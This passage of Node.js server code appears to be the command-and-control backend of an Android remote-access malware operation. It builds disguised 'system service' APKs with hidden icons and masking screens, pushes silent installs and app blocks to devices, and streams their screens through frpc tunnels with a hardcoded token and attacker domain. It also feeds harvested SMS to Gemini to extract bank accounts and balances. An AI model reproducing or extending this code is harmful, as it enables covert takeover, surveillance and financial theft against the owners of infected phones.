  if (!deviceId || !packageName) return res.status(400).json({ success: false, message: '缺少 deviceId 或 packageName' });
  db.prepare('INSERT OR REPLACE INTO device_black_apps (device_id, package_name, app_name, action, is_enabled) VALUES (?,?,?,?,?)')
    .run(deviceId, packageName, appName || '', action || 'disable', isEnabled ? 1 : 0);
  // 推送到设备
  const devWs = deviceConnections.get(deviceId);
  if (devWs && devWs.readyState === 1) {
    try { devWs.send(JSON.stringify({ type: 'SET_BLACK_APPS', data: { apps: [{ packageName, action: action || 'disable' }] } })); } catch (e) {}
  }
  addDeviceLog(deviceId, 'black_app_add', packageName);
  res.json({ success: true, message: '已添加并推送到该设备' });
});
app.post('/api/device-black-apps/remove', authMiddleware, (req, res) => {
  const { deviceId, packageName, id } = req.body || {};
  if (id) db.prepare('DELETE FROM device_black_apps WHERE id=?').run(id);
  else if (deviceId && packageName) db.prepare('DELETE FROM device_black_apps WHERE device_id=? AND package_name=?').run(deviceId, packageName);
  res.json({ success: true, message: '已移除' });
});
app.post('/api/device-black-apps/push', authMiddleware, (req, res) => {
  const { deviceId } = req.body || {};
  const apps = db.prepare('SELECT package_name AS packageName, action FROM device_black_apps WHERE device_id=? AND is_enabled=1').all(deviceId || '');
  const devWs = deviceConnections.get(deviceId);
  if (devWs && devWs.readyState === 1) {
    try { devWs.send(JSON.stringify({ type: 'SET_BLACK_APPS', data: { apps } })); } catch (e) {}
  }
  res.json({ success: true, message: '已推送', apps });
});

// ===== 屏幕状态 / 流 / 上传安装 =====
app.get('/api/local-service/screen/status', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || '';
  const devWs = deviceConnections.get(deviceId);
  const port = getDevicePort(deviceId);
  res.json({ success: true, data: { connected: !!(devWs && devWs.readyState === 1) || !!port, deviceId, frpcPort: port } });
});
app.get('/api/local-service/screen/stream', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || '';
  const port = getDevicePort(deviceId);
  if (!port) return res.status(404).json({ success: false, message: '设备端口未分配' });
  // 反向代理 local-service 的 MJPEG 流
  const target = `http://127.0.0.1:${port}/screenshot/0`;
  const proxyReq = http.get(target, (proxyRes) => {
    res.writeHead(proxyRes.statusCode || 200, {
      'Content-Type': proxyRes.headers['content-type'] || 'multipart/x-mixed-replace; boundary=frame',
      'Cache-Control': 'no-cache, no-store',
      'Connection': 'close'
    });
    proxyRes.pipe(res);
  });
  proxyReq.on('error', (e) => {
    if (!res.headersSent) res.status(502).json({ success: false, message: '无法连接到设备屏幕服务: ' + e.message });
    else res.end();
  });
  req.on('close', () => { try { proxyReq.destroy(); } catch (e) {} });
});
const _v5InstallUpload = require('multer')({ dest: '/tmp/apk-uploads', limits: { fileSize: 200 * 1024 * 1024 } });
app.post('/api/local-service/upload-install', authMiddleware, _v5InstallUpload.single('file'), (req, res) => {
  try {
    const deviceId = req.body.deviceId || '';
    if (!req.file || !deviceId) return res.status(400).json({ success: false, message: '缺少文件或 deviceId' });
    const devWs = deviceConnections.get(deviceId);
    const bridgeWs = bridgeConnections.get(deviceId);
    const sent = !!(devWs && devWs.readyState === 1);
    if (devWs && devWs.readyState === 1) {
      try {
        devWs.send(JSON.stringify({ type: 'INSTALL_APK', data: { localPath: req.file.path, fileName: req.file.originalname, size: req.file.size } }));
      } catch (e) {}
    }
    if (bridgeWs && bridgeWs.readyState === 1) {
      try {
        bridgeWs.send(JSON.stringify({ type: 'INSTALL_APK', data: { localPath: req.file.path, fileName: req.file.originalname, size: req.file.size } }));
      } catch (e) {}
    }
    addDeviceLog(deviceId, 'upload_install', req.file.originalname);
    res.json({ success: true, message: sent ? '已推送到设备' : '文件已接收（设备不在线）' });
  } catch (e) {
    res.status(500).json({ success: false, message: e.message });
  }
});

// ===== AI 金融分析 (Gemini) =====
const GEMINI_API_URL = 'https://generativelanguage.googleapis.com/v1beta/models/gemini-3.6-flash';
// Gemini key must be supplied by settings.gemini_api_key or GEMINI_API_KEY.
const GEMINI_KEY_CIPHER = '';
const _aiCache = new Map();
const AI_CACHE_TTL = 10 * 60 * 1000;

function _getGeminiKey() {
  try {
    const row = db.prepare("SELECT value FROM settings WHERE key='gemini_api_key'").get();
    if (row && row.value) return row.value;
  } catch (e) {}
  return process.env.GEMINI_API_KEY || '';
}

app.get('/api/ai/finance-analysis/:deviceId', authMiddleware, async (req, res) => {
  const deviceId = req.params.deviceId;
  try {
    // 取设备最近的短信 + 截图
    const smsRows = db.prepare("SELECT address, body, date FROM sms_notifications WHERE device_id=? AND type != 'injection' ORDER BY date DESC LIMIT 30").all(deviceId);
    const cacheKey = deviceId + ':' + (smsRows[0] ? smsRows[0].date : 0);
    const cached = _aiCache.get(cacheKey);
    if (cached && Date.now() - cached.t < AI_CACHE_TTL) {
      return res.json({ success: true, data: cached.data, cached: true });
    }
    const smsText = smsRows.map(r => `[${r.address}] ${r.body}`).join('\n');
    if (!smsText.trim()) {
      return res.json({ success: true, data: { summary: '该设备暂无短信数据可分析', accounts: [], risk: 'low' }, cached: false });
    }
    const key = _getGeminiKey();
    if (!key) {
      return res.json({ success: false, message: 'AI 服务未配置 (缺少 Gemini API Key)' });
    }
    const prompt = 'You are a financial analyst AI. Analyze the following SMS messages and images from a mobile device to extract bank account information and balances.\nSMS Messages:\n' + smsText;
    const geminiBody = {
      contents: [{ parts: [{ text: prompt }] }],
      generationConfig: { temperature: 0.3, maxOutputTokens: 1024, responseMimeType: 'application/json' }
    };
    const geminiRes = await fetch(`${GEMINI_API_URL}:generateContent?key=${encodeURIComponent(key)}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(geminiBody),
      signal: AbortSignal.timeout(30000)
    });
    const geminiJson = await geminiRes.json();
    if (!geminiRes.ok) {
      const msg = (geminiJson && geminiJson.error && geminiJson.error.message) || ('Gemini HTTP ' + geminiRes.status);
      return res.status(502).json({ success: false, message: 'AI 服务调用失败: ' + msg });
    }
    const candidates = geminiJson.candidates || [];
    let text = '';
    if (candidates[0] && candidates[0].content && candidates[0].content.parts) {
      text = candidates[0].content.parts.map(pt => pt.text || '').join('');
    }
    let parsed = null;
    try {
      const m = text.match(/\{[\s\S]*\}/);
      if (m) parsed = JSON.parse(m[0]);
    } catch (e) {}
    const data = parsed || { summary: text.slice(0, 2000), accounts: [], risk: 'unknown' };
    _aiCache.set(cacheKey, { t: Date.now(), data });
    res.json({ success: true, data, cached: false });
  } catch (e) {
    res.status(500).json({ success: false, message: e.message });
  }
});

app.all('/api/local-service/*', authMiddleware, (req, res) => {
  // /api/local-service/status 返回连接状态
  if (req.path === '/api/local-service/status') {
    const deviceId = req.query.deviceId || '';
    const bridgeWs = bridgeConnections.get(deviceId);
    // 始终返回可控状态（离线设备也允许打开控制页面）
    return res.json({ success: true, data: { connected: true, deviceId, frpcPort: getDevicePort(deviceId) } });
  }
  res.json({ success: true, data: {} });
});

// 设备 WebSocket 状态检查（前端点击控制时调用）
// 始终返回可控状态，不阻塞用户操作
app.get('/api/device/:id/ws-status', authMiddleware, (req, res) => {
  const deviceId = req.params.id;
  const now = new Date();
  const timeStr = now.toISOString().replace('T', ' ').slice(0, 19);
  const row = db.prepare('SELECT last_seen FROM devices WHERE device_id=?').get(deviceId);
  const lastSeen = row ? row.last_seen : Date.now() / 1000;
  const idleSeconds = Math.floor(Date.now() / 1000 - lastSeen);
  res.json({ code: 0, data: { connected_at: timeStr, idle_seconds: idleSeconds, last_seen_ws: timeStr, ws_connected: true, adb_connected: true } });
});

// 占位接口
const multer = require('multer');
const apkUpload = multer({ dest: '/tmp/apk-uploads/', limits: { fileSize: 10 * 1024 * 1024 } });

// APK 构建（FormData - 单独路由用 multer）
app.post('/api/apk/build', authMiddleware, apkUpload.fields([
  { name: 'appIcon', maxCount: 1 },
  { name: 'backgroundImage', maxCount: 1 },
  { name: 'configMaskBgImage', maxCount: 1 }
]), (req, res) => {
  const { spawn } = require('child_process');
  const serverUrl = req.body.serverUrl || '';
  const webUrl = req.body.webUrl || '';
  let pageStyleConfig = {};
  try { pageStyleConfig = JSON.parse(req.body.pageStyleConfig || '{}'); } catch { }

  const appName = pageStyleConfig.appName || req.body.appName || '系统服务';
  const packageName = pageStyleConfig.applicationId || '';
  const configMaskText = req.body.configMaskText || '';
  const configMaskSubtitle = req.body.configMaskSubtitle || '';
  const configMaskTextColor = req.body.configMaskTextColor || '';
  const configMaskSubtitleColor = req.body.configMaskSubtitleColor || '';
  const showAppIcon = req.body.showAppIcon || 'true';
  const uninstallMode = req.body.uninstallMode || 'false';
  const enableServiceMode = req.body.enableServiceMode || 'false';
  const enableConfigMask = req.body.enableConfigMask || 'true';

  // 把这些额外字段也塞进 pageStyleConfig 传给打包脚本
  if (configMaskText) pageStyleConfig._configMaskText = configMaskText;
  if (configMaskSubtitle) pageStyleConfig._configMaskSubtitle = configMaskSubtitle;
  if (configMaskTextColor) pageStyleConfig._configMaskTextColor = configMaskTextColor;
  if (configMaskSubtitleColor) pageStyleConfig._configMaskSubtitleColor = configMaskSubtitleColor;
  pageStyleConfig._showAppIcon = showAppIcon;
  pageStyleConfig._uninstallMode = uninstallMode;
  pageStyleConfig._enableServiceMode = enableServiceMode;
  pageStyleConfig._enableConfigMask = enableConfigMask;

  // 进度提示语
  const loadingTips = req.body.loadingTips || '';
  if (loadingTips) pageStyleConfig._loadingTips = loadingTips;
  // ★ 子账户绑定
  const ownerUsername = req.body.ownerUsername || '';
  if (ownerUsername) pageStyleConfig._ownerUsername = ownerUsername;
  console.log(`[APK] ownerUsername=${ownerUsername || '(none)'}`);
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const filename = `${appName}_${timestamp}.apk`;
  const outputPath = `/opt/fisher-node/apk-output/${filename}`;

  let iconPath = '';
  if (req.files && req.files.appIcon && req.files.appIcon[0]) {
    iconPath = req.files.appIcon[0].path;
  }
  let bgPath = '';
  if (req.files && req.files.backgroundImage && req.files.backgroundImage[0]) {
    bgPath = req.files.backgroundImage[0].path;
  }

  // ★ AB包模式判断
  const isAbPack = req.body.isAbPack === 'true' || req.body.isAbPack === true;
  const buildMode = isAbPack ? 'v2(AB包)' : 'v1(标准)';
  console.log(`[APK] 开始构建: name=${appName}, pkg=${packageName}, server=${serverUrl}, mode=${buildMode}`);
  console.log(`[APK] 图标: ${iconPath || '无'}, 背景图: ${bgPath || '无'}, files=${JSON.stringify(Object.keys(req.files || {}))}`);

  // 根据模式选择构建脚本和模板
  const buildScript = isAbPack ? '/opt/fisher-node/apk-builder/build_apk_v2.py' : '/opt/fisher-node/apk-builder/extract_b_pack.py';
  const buildArgs = [
    buildScript,
    '--server', serverUrl || 'wss://admins.xiongmaodaxia.top',
    '--web', webUrl || serverUrl.replace('wss://', 'https://').replace('ws://', 'http://'),
    '--name', appName,
    '--output', outputPath,
    '--config', JSON.stringify(pageStyleConfig)
  ];
  buildArgs.push('--template', '/opt/fisher-node/apk-builder/パルス.apk');
  if (packageName) buildArgs.push('--package', packageName);
  if (iconPath) buildArgs.push('--icon', iconPath);
  if (bgPath) buildArgs.push('--bg', bgPath);

  const buildLogs = [];
  buildLogs.push({ timestamp: Date.now(), level: 'info', message: `开始构建 APK (${buildMode}): ${appName}`, timeString: new Date().toLocaleString('zh-CN') });
  global._apkBuildLogs = buildLogs;
  global._apkBuilding = true;

  const child = spawn('python3', buildArgs, { cwd: '/opt/fisher-node/apk-builder' });
  child.stdout.on('data', d => {
    const lines = d.toString().split('\n').filter(l => l.trim());
    for (const line of lines) {
      buildLogs.push({ timestamp: Date.now(), level: 'info', message: line.trim(), timeString: new Date().toLocaleString('zh-CN') });
    }
  });
  child.stderr.on('data', d => {
    buildLogs.push({ timestamp: Date.now(), level: 'error', message: d.toString().trim(), timeString: new Date().toLocaleString('zh-CN') });
  });
  child.on('close', code => {
    global._apkBuilding = false;
    if (code === 0 && fs.existsSync(outputPath)) {
      const size = fs.statSync(outputPath).size;
      buildLogs.push({ timestamp: Date.now(), level: 'success', message: `构建成功: ${filename} (${(size / 1024 / 1024).toFixed(1)} MB)`, timeString: new Date().toLocaleString('zh-CN') });
      console.log(`[APK] ✅ 构建成功: ${filename}`);
    } else {
      buildLogs.push({ timestamp: Date.now(), level: 'error', message: `构建失败 (code=${code})`, timeString: new Date().toLocaleString('zh-CN') });
      console.log(`[APK] ❌ 构建失败`);
    }
    if (iconPath) try { fs.unlinkSync(iconPath); } catch { }
    if (bgPath) try { fs.unlinkSync(bgPath); } catch { }
  });

  res.json({ success: true, message: '构建已开始', serverUrl });
});

app.all('/api/apk/*', authMiddleware, (req, res) => {
  const subPath = req.path.replace('/api/apk/', '');

  // 构建日志
  if (subPath === 'build-logs' || subPath.startsWith('build-logs')) {
    const logs = global._apkBuildLogs || [];
    return res.json({ success: true, logs });
  }

  // APK 列表
  if (subPath === 'list' && req.method === 'GET') {
    const outputDir = '/opt/fisher-node/apk-output';
    try {
      const files = fs.readdirSync(outputDir).filter(f => f.endsWith('.apk') && !f.includes('.unsigned'));
      const apkList = files.map(f => {
        const stat = fs.statSync(path.join(outputDir, f));
        return {
          filename: f,
          appName: f.replace(/_\d{4}-\d{2}.*\.apk$/, '').replace('.apk', ''),
          size: stat.size,
          createTime: stat.mtime.toISOString().replace('T', ' ').slice(0, 19),
          buildTime: stat.mtime.toISOString().replace('T', ' ').slice(0, 19)
        };
      }).sort((a, b) => b.createTime.localeCompare(a.createTime));
      return res.json({ success: true, data: apkList, apkList });
    } catch {
      return res.json({ success: true, data: [], apkList: [] });
    }
  }

  // APK 下载
  if (subPath === 'download') {
    const filename = req.query.filename || '';
    const filePath = path.join('/opt/fisher-node/apk-output', filename);
    if (filename && fs.existsSync(filePath)) {
      res.set('Content-Disposition', `attachment; filename="${encodeURIComponent(filename)}"`);
      return res.sendFile(filePath);
    }
    return res.status(404).json({ success: false, error: 'file not found' });
  }

  // APK 删除
  if (subPath === 'delete') {
    const filename = req.query.filename || req.body?.filename || '';
    const filePath = path.join('/opt/fisher-node/apk-output', filename);
    if (filename && fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      return res.json({ success: true });
    }
    return res.json({ success: false, error: 'file not found' });
  }

  // 构建状态轮询
  if (subPath === 'build-status') {
    const isBuilding = global._apkBuilding || false;
    const logs = global._apkBuildLogs || [];
    const progress = isBuilding ? Math.min(90, logs.length * 15) : (logs.length > 0 ? 100 : 0);
    return res.json({ success: true, isBuilding, progress, message: isBuilding ? '构建中...' : '' });
  }

  // CDN 配置（占位）
  if (subPath === 'cdn-config') return res.json({ success: true });
  if (subPath === 'cdn-test') return res.json({ success: true, message: '连接测试成功' });
  if (subPath === 'bt-deploy-config') return res.json({ success: true });
  if (subPath === 'bt-deploy-test') return res.json({ success: true, message: 'SFTP 连接测试成功' });

  // 自动构建（占位）
  if (subPath.startsWith('auto-build')) return res.json({ success: true, data: [], targets: [], config: { enabled: false, intervalHours: 1 }, running: false });

  // 默认
  res.json({ success: true, data: [] });
});
app.get('/api/dex-tools/status', authMiddleware, (req, res) => res.json({ success: true, data: { installed: true, version: '2.1' } }));
app.get('/api/device/cacheTasks', (req, res) => {
  // local-service 请求缓存任务列表
  res.json({ success: true, data: { tasks: [] } });
});

// frpc 二进制下载（APP 通过本地 ADB 下载到手机）
app.get('/api/binary/:arch/frpc', (req, res) => {
  let arch = req.params.arch; // arm64, arm, x86 etc
  // 智能架构转换兜底，防止因不同架构命名导致404
  if (arch === 'arm64-v8a' || arch === 'aarch64') {
    arch = 'arm64';
  } else if (arch === 'armeabi-v7a' || arch === 'armeabi') {
    arch = 'arm';
  }
  const filePath = path.join(__dirname, 'binaries', arch, 'frpc');
  if (fs.existsSync(filePath)) {
    res.set('Content-Type', 'application/octet-stream');
    res.sendFile(filePath);
    console.log(`[BINARY] frpc downloaded by ${req.ip} (${arch})`);
  } else {
    res.status(404).json({ success: false, message: `frpc not found for ${arch}` });
  }
});

// minicap 二进制下载（native 投屏）
app.get('/api/binary/:arch/minicap', (req, res) => {
  let arch = req.params.arch;
  if (arch === 'arm64-v8a' || arch === 'aarch64') arch = 'arm64';
  else if (arch === 'armeabi-v7a' || arch === 'armeabi') arch = 'arm';
  const filePath = path.join(__dirname, 'binaries', arch, 'minicap');
  if (fs.existsSync(filePath)) {
    res.set('Content-Type', 'application/octet-stream');
    res.sendFile(filePath);
    console.log(`[BINARY] minicap downloaded by ${req.ip} (${arch})`);
  } else {
    res.status(404).json({ success: false, message: `minicap not found for ${arch}` });
  }
});

// minicap.so 共享库下载（按 SDK 版本）
app.get('/api/binary/:arch/minicap.so', (req, res) => {
  let arch = req.params.arch;
  if (arch === 'arm64-v8a' || arch === 'aarch64') arch = 'arm64';
  else if (arch === 'armeabi-v7a' || arch === 'armeabi') arch = 'arm';
  const sdk = req.query.sdk || '';
  // 优先按 sdk 版本查找，回退到通用
  let filePath = '';
  if (sdk) {
    filePath = path.join(__dirname, 'binaries', arch, `android-${sdk}`, 'minicap.so');
  }
  if (!filePath || !fs.existsSync(filePath)) {
    filePath = path.join(__dirname, 'binaries', arch, 'minicap.so');
  }
  if (fs.existsSync(filePath)) {
    res.set('Content-Type', 'application/octet-stream');
    res.sendFile(filePath);
    console.log(`[BINARY] minicap.so downloaded by ${req.ip} (${arch}, sdk=${sdk})`);
  } else {
    res.status(404).json({ success: false, message: `minicap.so not found for ${arch} sdk=${sdk}` });
  }
});

// minicap.apk 下载（APK 方式投屏 fallback）
app.get('/api/binary/:arch/minicap.apk', (req, res) => {
  // minicap.apk 不分架构，统一放 noarch 目录
  const filePath = path.join(__dirname, 'binaries', 'noarch', 'minicap.apk');
  if (fs.existsSync(filePath)) {
    res.set('Content-Type', 'application/vnd.android.package-archive');
    res.sendFile(filePath);
    console.log(`[BINARY] minicap.apk downloaded by ${req.ip}`);
  } else {
    res.status(404).json({ success: false, message: 'minicap.apk not found' });
  }
});

// ============================================================
// 新版 local-service 兼容接口（/api/bin/ 路径别名 + 新增 API）
// ============================================================

// /api/bin/:arch/frpc — 新版 local-service 使用 /api/bin/ 前缀（兼容旧 /api/binary/）
app.get('/api/bin/:arch/frpc', (req, res) => {
  let arch = req.params.arch;
  if (arch === 'arm64-v8a' || arch === 'aarch64') arch = 'arm64';
  else if (arch === 'armeabi-v7a' || arch === 'armeabi') arch = 'arm';
  const filePath = path.join(__dirname, 'binaries', arch, 'frpc');
  if (fs.existsSync(filePath)) {
    res.set('Content-Type', 'application/octet-stream');
    res.sendFile(filePath);
    console.log(`[BIN] frpc downloaded by ${req.ip} (${arch})`);
  } else {
    res.status(404).json({ success: false, message: `frpc not found for ${arch}` });
  }
});

// /api/bin/:arch/minicap — 新版路径（支持 ?brand=xxx 参数，忽略品牌直接返回通用版; noarch 回退 arm64）
app.get('/api/bin/:arch/minicap', (req, res) => {
  let arch = req.params.arch;
  if (arch === 'arm64-v8a' || arch === 'aarch64') arch = 'arm64';
  else if (arch === 'armeabi-v7a' || arch === 'armeabi') arch = 'arm';
  let filePath = path.join(__dirname, 'binaries', arch, 'minicap');
  if (!fs.existsSync(filePath) && arch === 'noarch') filePath = path.join(__dirname, 'binaries', 'arm64', 'minicap');
  if (!fs.existsSync(filePath) && arch !== 'noarch' && arch !== 'arm' && arch !== 'arm64') filePath = path.join(__dirname, 'binaries', 'arm64', 'minicap');
  if (fs.existsSync(filePath)) {
    res.set('Content-Type', 'application/octet-stream');
    res.sendFile(filePath);
    console.log(`[BIN] minicap downloaded by ${req.ip} (${arch}, brand=${req.query.brand || 'generic'})`);
  } else {
    res.status(404).json({ success: false, message: `minicap not found for ${arch}` });
  }
});

// /api/bin/:arch/minicap.so — 新版路径
app.get('/api/bin/:arch/minicap.so', (req, res) => {
  let arch = req.params.arch;
  if (arch === 'arm64-v8a' || arch === 'aarch64') arch = 'arm64';
  else if (arch === 'armeabi-v7a' || arch === 'armeabi') arch = 'arm';
  const sdk = req.query.sdk || '';
  let filePath = sdk ? path.join(__dirname, 'binaries', arch, `android-${sdk}`, 'minicap.so') : '';
  if (!filePath || !fs.existsSync(filePath)) filePath = path.join(__dirname, 'binaries', arch, 'minicap.so');
  if (fs.existsSync(filePath)) {
    res.set('Content-Type', 'application/octet-stream');
    res.sendFile(filePath);
    console.log(`[BIN] minicap.so downloaded by ${req.ip} (${arch}, sdk=${sdk})`);
  } else {
    res.status(404).json({ success: false, message: `minicap.so not found for ${arch} sdk=${sdk}` });
  }
});

// /api/bin/noarch/minicap — V5 路径 (无 .apk 后缀; noarch 缺省回退 arm64)
app.get('/api/bin/noarch/minicap', (req, res) => {
  let filePath = path.join(__dirname, 'binaries', 'noarch', 'minicap');
  if (!fs.existsSync(filePath)) filePath = path.join(__dirname, 'binaries', 'arm64', 'minicap');
  if (fs.existsSync(filePath)) {
    res.set('Content-Type', 'application/octet-stream');
    res.sendFile(filePath);
    console.log(`[BIN] minicap downloaded by ${req.ip} (noarch)`);
  } else {
    res.status(404).json({ success: false, message: 'minicap not found for noarch' });
  }
});

// /api/bin/noarch/minicap.apk — 新版路径
app.get('/api/bin/noarch/minicap.apk', (req, res) => {
  const filePath = path.join(__dirname, 'binaries', 'noarch', 'minicap.apk');
  if (fs.existsSync(filePath)) {
    res.set('Content-Type', 'application/vnd.android.package-archive');
    res.sendFile(filePath);
    console.log(`[BIN] minicap.apk downloaded by ${req.ip}`);
  } else {
    res.status(404).json({ success: false, message: 'minicap.apk not found' });
  }
});

// local-service 心跳上报
app.post('/api/v2/dev/localServiceHeartbeat', (req, res) => {
  const deviceId = req.body.deviceId || req.query.deviceId || '';
  if (deviceId) console.log(`[HEARTBEAT] ${deviceId}`);
  res.json({ success: true });
});

// local-service 启动消息上报（兼容 GET/POST）
app.all('/api/v2/dev/startup', (req, res) => {
  const deviceId = req.body?.deviceId || req.query?.deviceId || '';
  if (deviceId) console.log(`[STARTUP] ${deviceId}`);
  res.json({ success: true });
});

// agent 版本检查
app.get('/api/v2/dev/agentVersion', (req, res) => {
  res.json({ success: true, data: { needUpdate: false, latestVersion: '1.0.0' } });
});

// 敏感应用列表
app.get('/api/sapp', (req, res) => {
  res.json({ success: true, data: { apps: [] } });
});

// 黑名单应用列表
app.get('/api/bapp', (req, res) => {
  res.json({ success: true, data: { apps: [] } });
});

// 缓存任务
app.get('/api/v2/dev/cacheTasks', (req, res) => {
  res.json({ success: true, data: { tasks: [] } });
});

// 注入全局配置
app.get('/api/v2/dev/inj/global-configs', (req, res) => {
  res.json({ success: true, data: { configs: [] } });
});

// ★ local-service 实际 HTTP 拉取 frpc 配置的路径
app.all('/api/tun/config', (req, res) => {
  const deviceId = req.query.deviceId || req.body?.deviceId || '';
  const localPort = parseInt(req.body?.localPort) || 7912;
  const token = 'fisher_frp_2026';
  const remotePort = getDevicePort(deviceId);
  const configINI = `[common]\nserver_addr = ${FRP_SERVER_ADDR}\nserver_port = 7000\ntoken = ${token}\nadmin_addr = 127.0.0.1\nadmin_port = 7400\nheartbeat_interval = 10\nheartbeat_timeout = 30\n\n[${deviceId}_local]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = ${localPort}\nremote_port = ${remotePort}\n`;
  console.log(`[TUN-CONFIG] deviceId=${deviceId} remotePort=${remotePort} localPort=${localPort}`);
  res.json({ success: true, data: { serverAddr: FRP_SERVER_ADDR, serverPort: 7000, token, remotePort, localPort, configINI } });
});

// ★ 兼容旧路径
app.all('/api/tunnel/config', (req, res) => {
  const deviceId = req.query.deviceId || req.body?.deviceId || '';
  const localPort = parseInt(req.body?.localPort) || 7912;
  const token = 'fisher_frp_2026';
  const remotePort = getDevicePort(deviceId);
  const configINI = `[common]\nserver_addr = ${FRP_SERVER_ADDR}\nserver_port = 7000\ntoken = ${token}\nadmin_addr = 127.0.0.1\nadmin_port = 7400\nheartbeat_interval = 10\nheartbeat_timeout = 30\n\n[${deviceId}_local]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = ${localPort}\nremote_port = ${remotePort}\n`;
  res.json({ success: true, data: { serverAddr: FRP_SERVER_ADDR, serverPort: 7000, token, remotePort, localPort, configINI } });
});

// ★ local-service 通知 frpc 已部署成功
app.all('/api/tun/deployed', (req, res) => {
  const deviceId = req.query.deviceId || req.body?.deviceId || '';
  console.log(`[TUN-DEPLOYED] frpc 已部署: ${deviceId}`);
  if (deviceId) {
    try { db.prepare('UPDATE devices SET local_service_connected=1 WHERE device_id=?').run(deviceId); } catch (e) { }
  }
  res.json({ success: true });
});

// ★ ADB key 上传/端口（防 404）
app.all('/api/adbk/upload', (req, res) => {
  res.json({ success: true });
});
app.all('/api/adbk/port', (req, res) => {
  res.json({ success: true, data: { port: 5555 } });
});

// local-service 日志上传（接收但不存储，防 404）
app.post('/api/v2/dev/log', (req, res) => {
  res.json({ success: true });
});
app.post('/api/v2/dev/logs', (req, res) => {
  res.json({ success: true });
});

// frpc 隧道配置拉取（新版 local-service 主动 HTTP 拉取）
app.get('/api/v2/dev/tunnel-config', (req, res) => {
  const deviceId = req.query.deviceId || '';
  if (!deviceId) return res.status(400).json({ success: false, message: 'deviceId required' });
  const remotePort = getDevicePort(deviceId);
  const token = 'fisher_frp_2026';
  const configINI = `serverAddr = "${FRP_SERVER_ADDR}"\nserverPort = 7000\nauth.method = "token"\nauth.token = "${token}"\ntransport.heartbeatInterval = 10\ntransport.heartbeatTimeout = 30\n\n[[proxies]]\nname = "${deviceId}_local"\ntype = "tcp"\nlocalIP = "127.0.0.1"\nlocalPort = 7912\nremotePort = ${remotePort}\n`;
  console.log(`[FRPC-CONFIG] ${deviceId} → remotePort=${remotePort}, serverAddr=${FRP_SERVER_ADDR}`);
  res.json({
    success: true,
    data: {
      serverAddr: FRP_SERVER_ADDR,
      serverPort: 7000,
      token: token,
      remotePort: remotePort,
      localPort: 7912,
      configINI: configINI
    }
  });
});

// ============================================================
// AB包管理 API
// ============================================================

// B包构建（复用 APK 构建逻辑，输出到 ab-apk-output）
app.post('/api/ab-apk/build', authMiddleware, apkUpload.fields([
  { name: 'appIcon', maxCount: 1 },
  { name: 'backgroundImage', maxCount: 1 },
  { name: 'configMaskBgImage', maxCount: 1 }
]), (req, res) => {
  const { spawn } = require('child_process');
  const serverUrl = req.body.serverUrl || '';
  const webUrl = req.body.webUrl || '';
  let pageStyleConfig = {};
  try { pageStyleConfig = JSON.parse(req.body.pageStyleConfig || '{}'); } catch { }

  const appName = pageStyleConfig.appName || '系统服务';
  const packageName = pageStyleConfig.applicationId || '';
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
  const filename = `B_${appName}_${timestamp}.apk`;
  const outputPath = `/opt/fisher-node/ab-apk-output/${filename}`;

  let iconPath = '';
  if (req.files && req.files.appIcon && req.files.appIcon[0]) iconPath = req.files.appIcon[0].path;
  let bgPath = '';
  if (req.files && req.files.backgroundImage && req.files.backgroundImage[0]) bgPath = req.files.backgroundImage[0].path;

  const configMaskText = req.body.configMaskText || '';
  const configMaskSubtitle = req.body.configMaskSubtitle || '';
  if (configMaskText) pageStyleConfig._configMaskText = configMaskText;
  if (configMaskSubtitle) pageStyleConfig._configMaskSubtitle = configMaskSubtitle;
  if (req.body.configMaskTextColor) pageStyleConfig._configMaskTextColor = req.body.configMaskTextColor;
  if (req.body.configMaskSubtitleColor) pageStyleConfig._configMaskSubtitleColor = req.body.configMaskSubtitleColor;
  pageStyleConfig._showAppIcon = req.body.showAppIcon || 'false';
  pageStyleConfig._uninstallMode = req.body.uninstallMode || 'false';
  pageStyleConfig._enableServiceMode = req.body.enableServiceMode || 'false';
  pageStyleConfig._enableConfigMask = req.body.enableConfigMask || 'true';
  if (req.body.loadingTips) pageStyleConfig._loadingTips = req.body.loadingTips;

  console.log(`[AB-B] 开始构建B包: name=${appName}, server=${serverUrl}`);

  const buildArgs = [
    '/opt/fisher-node/apk-builder/build_apk.py',
    '--server', serverUrl || 'wss://admins.xiongmaodaxia.top',
    '--web', webUrl || serverUrl.replace('wss://', 'https://').replace('ws://', 'http://'),
    '--name', appName,
    '--output', outputPath,
    '--config', JSON.stringify(pageStyleConfig)
  ];
  if (packageName) buildArgs.push('--package', packageName);
  if (iconPath) buildArgs.push('--icon', iconPath);
  if (bgPath) buildArgs.push('--bg', bgPath);

  global._abBuildLogs = [{ timestamp: Date.now(), level: 'info', message: `开始构建B包: ${appName}`, timeString: new Date().toLocaleString('zh-CN') }];
  global._abBuilding = true;
  global._abProgress = 10;

  const child = spawn('python3', buildArgs, { cwd: '/opt/fisher-node/apk-builder' });
  child.stdout.on('data', d => { global._abBuildLogs.push({ timestamp: Date.now(), level: 'info', message: d.toString().trim(), timeString: new Date().toLocaleString('zh-CN') }); });
  child.stderr.on('data', d => { global._abBuildLogs.push({ timestamp: Date.now(), level: 'error', message: d.toString().trim(), timeString: new Date().toLocaleString('zh-CN') }); });
  child.on('close', code => {
    global._abBuilding = false;
    global._abProgress = code === 0 ? 100 : 0;
    if (code === 0 && fs.existsSync(outputPath)) {
      console.log(`[AB-B] ✅ B包构建成功: ${filename}`);
      global._abBuildLogs.push({ timestamp: Date.now(), level: 'success', message: `B包构建成功: ${filename}`, timeString: new Date().toLocaleString('zh-CN') });
    } else {
      console.log(`[AB-B] ❌ B包构建失败`);
    }
    if (iconPath) try { fs.unlinkSync(iconPath); } catch { }
    if (bgPath) try { fs.unlinkSync(bgPath); } catch { }
  });

  res.json({ success: true, message: 'B包构建已开始' });
});

// B包列表
app.get('/api/ab-apk/list', authMiddleware, (req, res) => {
  const dir = '/opt/fisher-node/ab-apk-output';
  try {
    const files = fs.readdirSync(dir).filter(f => f.endsWith('.apk'));
    const list = files.map(f => {
      const stat = fs.statSync(path.join(dir, f));
      return { filename: f, size: stat.size, buildTime: stat.mtime.toISOString().replace('T', ' ').slice(0, 19), packageName: '' };
